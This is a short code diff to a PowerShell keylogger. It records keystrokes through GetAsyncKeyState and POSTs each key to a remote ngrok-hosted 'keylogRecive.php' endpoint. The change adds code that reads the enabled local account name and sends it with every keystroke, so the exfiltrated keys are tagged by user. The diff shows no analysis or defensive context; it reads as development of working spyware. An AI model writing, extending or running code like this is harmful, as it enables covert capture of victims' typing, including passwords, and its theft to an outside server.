@@ -1,4 +1,6 @@
-
+# gets the username of the
+$user = Get-LocalUser | Where-Object Enabled | Select-Object Name
+write-host $user.Name
 $Signature = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
     public static extern short GetAsyncKeyState(int virtualKeyCode);
@@ -14,6 +16,7 @@ do
             $Url = "http://b534-2a02-c7e-5678-da00-6b65-33cf-60a1-1afb.ngrok.io/keylogRecive.php"
             $Body = @{
                 key = $ascii
+                user = $user.Name
             }
             try{
                 Invoke-WebRequest -Method 'Post' -Uri $url -Body $body -TimeoutSec 1
